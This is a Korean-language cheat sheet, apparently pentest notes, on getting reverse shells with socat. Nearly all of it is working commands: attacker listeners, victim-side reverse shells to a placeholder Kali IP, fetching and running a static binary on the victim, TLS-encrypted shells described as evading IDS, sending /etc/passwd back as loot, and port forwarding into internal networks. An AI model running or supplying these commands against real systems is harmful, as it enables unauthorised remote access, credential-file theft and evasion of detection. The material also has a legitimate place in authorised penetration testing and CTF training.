# socat

# 리버스쉘 — Socat

nc보다 강력한 연결 유틸리티. 즉시 완전한 TTY 쉘 획득 가능 (별도 업그레이드 불필요).

---

## 리스너 (공격자 측)

```bash
# 기본 리스너
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# ★ 완전한 TTY 리스너 (가장 많이 사용)
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# 백그라운드로
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444 &
```

---

## 리버스쉘 연결 (피해자 측)

```bash
# 기본 연결
socat TCP:<칼리IP>:4444 EXEC:/bin/sh

# ★ 완전한 인터랙티브 TTY (가장 권장)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<칼리IP>:4444

# sh 버전
socat exec:'sh -li',pty,stderr,setsid,sigint,sane TCP:<칼리IP>:4444
```

---

## 피해자에 socat 없을 때 — 정적 바이너리 업로드

```bash
# 칼리에서 정적 바이너리 제공
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat_static
python3 -m http.server 80

# 피해자에서 다운로드 후 실행
wget http://<칼리IP>/socat_static -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:<칼리IP>:4444
```

---

## SSL/TLS 암호화 쉘 (IDS 우회)

```bash
# 칼리: 인증서 생성
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# 칼리: SSL 리스너
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:/bin/bash

# 피해자: SSL 연결
socat OPENSSL:<칼리IP>:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## 파일 전송

```bash
# 칼리 → 피해자 (보내기)
# 칼리:
socat TCP-LISTEN:4444,reuseaddr < linpeas.sh
# 피해자:
socat TCP:<칼리IP>:4444 > /tmp/linpeas.sh

# 피해자 → 칼리 (가져오기)
# 칼리:
socat TCP-LISTEN:4444,reuseaddr > loot.txt
# 피해자:
socat TCP:<칼리IP>:4444 < /etc/passwd
```

---

## 포트 포워딩

```bash
# 로컬 포트 → 원격 포트
socat TCP-LISTEN:8080,reuseaddr,fork TCP:<타겟IP>:80

# 내부망 서비스 노출 (피해자에서 실행)
socat TCP-LISTEN:9999,reuseaddr,fork TCP:127.0.0.1:8080
# 칼리에서: curl http://<피해자IP>:9999
```

---

## 팁

- socat 리버스쉘은 TTY 업그레이드 과정 완전 생략 가능
- `pty,stderr,setsid,sigint,sane` 옵션이 핵심 (인터랙티브 터미널 구현)
- 피해자에 socat 없을 때 정적 바이너리 업로드로 해결
- SSL 버전은 Wireshark/IDS 탐지 우회에 효과적